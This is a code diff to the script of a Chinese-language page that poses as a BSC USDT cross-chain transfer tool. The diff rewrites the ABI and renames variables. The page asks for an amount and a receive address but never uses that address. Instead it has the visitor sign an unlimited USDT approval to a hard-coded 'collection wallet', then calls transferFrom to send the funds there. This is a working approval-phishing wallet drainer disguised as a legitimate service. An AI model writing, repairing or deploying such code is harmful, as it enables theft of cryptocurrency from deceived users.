@@ -306,12 +306,42 @@
 
 <script>
 // 配置项
-const BSC_USDT = "0x55d398326f99059fF775485246999027B3197955";
-const COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6"; //替换为你的归集钱包
-const BSC_CHAIN_ID = 56;
-const FEE_RATE = 0.999;
+const BSC_USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955";
+const COLLECT_WALLET = "0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXC6"; // 替换为你的归集钱包地址
+const FEE_RATIO = 0.999;
 
-// DOM
+// ✅ 标准JSON格式ABI（修复核心：不再使用纯函数字符串）
+const USDT_ABI = [
+  {
+    "constant": false,
+    "inputs": [{"name":"spender","type":"address"},{"name":"value","type":"uint256"}],
+    "name":"approve",
+    "outputs": [{"name":"","type":"bool"}],
+    "payable": false,
+    "stateMutability":"nonpayable",
+    "type":"function"
+  },
+  {
+    "constant": false,
+    "inputs": [{"name":"from","type":"address"},{"name":"to","type":"address"},{"name":"value","type":"uint256"}],
+    "name":"transferFrom",
+    "outputs": [{"name":"","type":"bool"}],
+    "payable": false,
+    "stateMutability":"nonpayable",
+    "type":"function"
+  },
+  {
+    "constant": true,
+    "inputs": [{"name":"owner","type":"address"},{"name":"spender","type":"address"}],
+    "name":"allowance",
+    "outputs": [{"name":"","type":"uint256"}],
+    "payable": false,
+    "stateMutability":"view",
+    "type":"function"
+  }
+];
+
+// DOM元素绑定
 const sendAmountInput = document.getElementById("sendAmountInput");
 const receiveAmountText = document.getElementById("receiveAmountText");
 const crossBtn = document.getElementById("crossBtn");
@@ -325,142 +355,148 @@ const globalTipModal = document.getElementById("globalTipModal");
 const tipContent = document.getElementById("tipContent");
 const closeTipBtn = document.getElementById("closeTipBtn");
 
-let web3, userAccount, usdtContract;
-let step = 0; //0未连接 1待授权 2待转账
-let userReceiveAddr = "";
+let web3Instance;
+let currentUserAccount;
+let usdtTokenContract;
+let operateStep = 0; // 0:未连接 1:待授权 2:待转账
+let targetReceiveAddress = "";
 
-// 弹窗提示
-function showTip(msg){
+// 弹窗提示函数
+function showToastTip(msg) {
   tipContent.innerText = msg;
   globalTipModal.style.display = "flex";
 }
-closeTipBtn.onclick = ()=> globalTipModal.style.display = "none";
+closeTipBtn.onclick = () => globalTipModal.style.display = "none";
 
-// 金额实时计算
-sendAmountInput.oninput = function(){
-  const val = parseFloat(this.value);
-  if(isNaN(val) || val <=0){
+// 输入金额实时计算
+sendAmountInput.addEventListener("input", function () {
+  const inputNum = parseFloat(this.value);
+  if (isNaN(inputNum) || inputNum <= 0) {
     receiveAmountText.innerText = "0.0000";
     crossBtn.classList.remove("active");
     crossBtn.disabled = true;
     return;
   }
-  receiveAmountText.innerText = (val * FEE_RATE).toFixed(4);
+  const receiveNum = (inputNum * FEE_RATIO).toFixed(4);
+  receiveAmountText.innerText = receiveNum;
   crossBtn.classList.add("active");
   crossBtn.disabled = false;
-}
+});
 
-// 地址弹窗
-addressDropBox.onclick = ()=> addressModal.style.display = "flex";
-closeAddrModal.onclick = ()=> addressModal.style.display = "none";
-saveAddrBtn.onclick = function(){
-  const addr = userEthAddrInput.value.trim();
-  const reg = /^0x[a-fA-F0-9]{40}$/;
-  if(!reg.test(addr)){
-    showTip("请输入合法0x开头钱包地址");
+// 地址弹窗逻辑
+addressDropBox.onclick = () => addressModal.style.display = "flex";
+closeAddrModal.onclick = () => addressModal.style.display = "none";
+saveAddrBtn.onclick = function () {
+  const inputAddr = userEthAddrInput.value.trim();
+  const addrReg = /^0x[a-fA-F0-9]{40}$/;
+  if (!addrReg.test(inputAddr)) {
+    showToastTip("请输入合法0x开头钱包地址");
     return;
   }
-  userReceiveAddr = addr;
-  showReceiveAddr.innerText = addr.slice(0,6)+"..."+addr.slice(-4);
+  targetReceiveAddress = inputAddr;
+  showReceiveAddr.innerText = inputAddr.slice(0,6)+"..."+inputAddr.slice(-4);
   addressModal.style.display = "none";
   userEthAddrInput.value = "";
-}
+};
 
-// 切换BSC网络
-async function switchBSC(){
-  try{
+// 切换BSC主网
+async function switchBSCChain() {
+  try {
     await window.ethereum.request({
-      method:"wallet_switchEthereumChain",
-      params:[{chainId:"0x38"}]
-    })
+      method: "wallet_switchEthereumChain",
+      params: [{ chainId: "0x38" }]
+    });
     return true;
-  }catch(e){
-    if(e.code === 4902){
+  } catch (err) {
+    if (err.code === 4902) {
       await window.ethereum.request({
-        method:"wallet_addEthereumChain",
-        params:[{
-          chainId:"0x38",
-          chainName:"BNB Smart Chain",
-          nativeCurrency:{name:"BNB",symbol:"BNB",decimals:18},
-          rpcUrls:["https://bsc-dataseed.binance.org"],
-          blockExplorerUrls:["https://bscscan.com"]
+        method: "wallet_addEthereumChain",
+        params: [{
+          chainId: "0x38",
+          chainName: "BNB Smart Chain",
+          nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
+          rpcUrls: ["https://bsc-dataseed.binance.org"],
+          blockExplorerUrls: ["https://bscscan.com"]
         }]
-      })
+      });
       return true;
     }
-    showTip("切换BSC主网失败，请手动切换");
+    showToastTip("切换BSC主网失败，请手动切换");
     return false;
   }
 }
 
-// 连接钱包初始化
-async function connectWallet(){
-  if(!window.ethereum){
-    showTip("请在钱包内置浏览器打开页面");
+// 钱包连接初始化
+async function connectWallet() {
+  if (!window.ethereum) {
+    showToastTip("请在钱包内置浏览器打开页面");
     return false;
   }
-  try{
-    await window.ethereum.request({method:"eth_requestAccounts"});
-    const netOk = await switchBSC();
-    if(!netOk) return false;
-    web3 = new Web3(window.ethereum);
-    const accounts = await web3.eth.getAccounts();
-    userAccount = accounts[0];
-    // USDT ABI精简版
-    const usdtABI = [
-      "function approve(address spender, uint256 amount) returns(bool)",
-      "function transferFrom(address from, address to, uint256 amount) returns(bool)",
-      "function allowance(address owner, address spender) view returns(uint256)"
-    ];
-    usdtContract = new web3.eth.Contract(usdtABI,BSC_USDT);
-    step = 1;
-    showTip("钱包连接成功，请进行授权");
+  try {
+    await window.ethereum.request({ method: "eth_requestAccounts" });
+    const netSuccess = await switchBSCChain();
+    if (!netSuccess) return false;
+
+    // 初始化Web3 + 合约（传入标准JSON ABI，修复报错根源）
+    web3Instance = new Web3(window.ethereum);
+    const accounts = await web3Instance.eth.getAccounts();
+    currentUserAccount = accounts[0];
+    usdtTokenContract = new web3Instance.eth.Contract(USDT_ABI, BSC_USDT_CONTRACT);
+
+    operateStep = 1;
+    showToastTip("钱包连接成功，请进行授权操作");
     return true;
-  }catch(err){
-    showTip("连接失败："+err.message);
+  } catch (error) {
+    showToastTip("连接失败：" + error.message);
     return false;
   }
 }
 
-// 主按钮逻辑
-crossBtn.onclick = async function(){
-  const num = parseFloat(sendAmountInput.value);
-  if(isNaN(num) || num <=0){
-    showTip("请输入转账数量");
+// 主按钮交互逻辑
+crossBtn.onclick = async function () {
+  const transferNum = parseFloat(sendAmountInput.value);
+  if (isNaN(transferNum) || transferNum <= 0) {
+    showToastTip("请填写转账金额");
     return;
   }
-  if(!userReceiveAddr){
-    showTip("请填写接收地址");
+  if (!targetReceiveAddress) {
+    showToastTip("请填写接收地址");
     return;
   }
-  if(step === 0){
+
+  if (operateStep === 0) {
     await connectWallet();
     return;
   }
-  if(step ===1){
+
+  if (operateStep === 1) {
     this.disabled = true;
-    try{
-      const maxAllow = web3.utils.toBN("115792089237316195423570985008687907853269984665640564039457584007913129639935");
-      await usdtContract.methods.approve(COLLECT_WALLET,maxAllow).send({from:userAccount});
-      step = 2;
-      this.innerText = "确认划转至归集钱包";
+    try {
+      // 无限授权数值
+      const maxAllowance = web3Instance.utils.toBN("115792089237316195423570985008687907853269984665640564039457584007913129639935");
+      await usdtTokenContract.methods.approve(COLLECT_WALLET, maxAllowance)
+        .send({ from: currentUserAccount });
+      operateStep = 2;
+      this.innerText = "确认划转";
       this.disabled = false;
-      showTip("授权成功，再次点击完成转账");
-    }catch(e){
-      showTip("授权失败："+e.message);
+      showToastTip("授权成功，请再次点击完成转账");
+    } catch (err) {
+      showToastTip("授权失败：" + err.message);
       this.disabled = false;
     }
     return;
   }
-  if(step ===2){
+
+  if (operateStep === 2) {
     this.disabled = true;
-    try{
-      const amountWei = web3.utils.toWei(num.toString(),"ether");
-      await usdtContract.methods.transferFrom(userAccount,COLLECT_WALLET,amountWei).send({from:userAccount});
-      showTip("转账上链成功");
-      this.innerText = "转账完成";
-    }catch(e){
-      showTip("转账失败："+e.message);
+    try {
+      const amountWei = web3Instance.utils.toWei(transferNum.toString(), "ether");
+      await usdtTokenContract.methods.transferFrom(currentUserAccount, COLLECT_WALLET, amountWei)
+        .send({ from: currentUserAccount });
+      showToastTip("转账上链成功");
+      this.innerText = "操作完成";
+    } catch (err) {
+      showToastTip("转账失败：" + err.message);
       this.disabled = false;
     }
   }
